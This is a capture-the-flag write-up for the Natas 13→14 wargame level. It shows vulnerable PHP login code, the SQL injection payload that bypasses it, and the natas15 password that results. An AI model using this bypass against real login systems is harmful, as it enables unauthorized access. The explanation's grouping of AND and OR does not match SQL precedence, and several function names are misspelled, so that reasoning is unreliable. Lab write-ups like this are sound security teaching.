## Level13 -> Level14


The webpage changed quite a bit in this level. 


There isn't a file upload button instead, a username and password form with a login button is given.


Here's the source code. 


```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```


The source code mainly consists of **[mysql](https://en.wikipedia.org/wiki/MySQL)**.


Let's look at the source code. 


The `mysqli_connect` function opens a connection to the mysql server. 


https://www.php.net/manual/en/function.mysqli-connect.php


The `my_sqli_select_db` function selects the default database in this case it looks like `natas14`.


https://www.php.net/manual/en/mysqli.select-db.php


The `my_sqli_num_rows` function returns the number of rows in the set. 


https://www.php.net/manual/en/mysqli-result.num-rows.php


The `my_sqli_query` function performs a query on the database. 


https://www.php.net/manual/en/mysqli.query.php


The `my_sqli_close` function closes a previously opened database. 


https://www.php.net/manual/en/mysqli.close.php



If you haven't solved any sql injection problems prior to this level, it will be impossible to solve it on your own. 


I'll show the answer right away. 


Entering the sql commands below will show the password. 


```sql
" OR "1"="1
" OR "1"="1
```


```
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```


But why and how does entering `" OR "1"="1` show the password?


There's a bug in the source code, it's this line. 


```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```


When you pass `" OR "1"="1` the sql query below gets executed.


```sql 
SELECT * from users where username="" OR "1"="1" and password="" OR "1"="1"
```


Since `1=1` is always true the the entire `WHERE` condition is now `(username="" OR TRUE) AND (password="" OR TRUE)`. 


This becomes `TRUE AND TRUE` which is always true.


Since the query above returns all the rows it will also meet the requirements for the `if` statement below.


```php 
 if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    }
```


To really build muscle memory on these sql injection problems you should try solving the **[burp suite labs](https://portswigger.net/web-security/sql-injection)**.


I haven't solved them myself yet, but have future plans to solve and publish writeups. 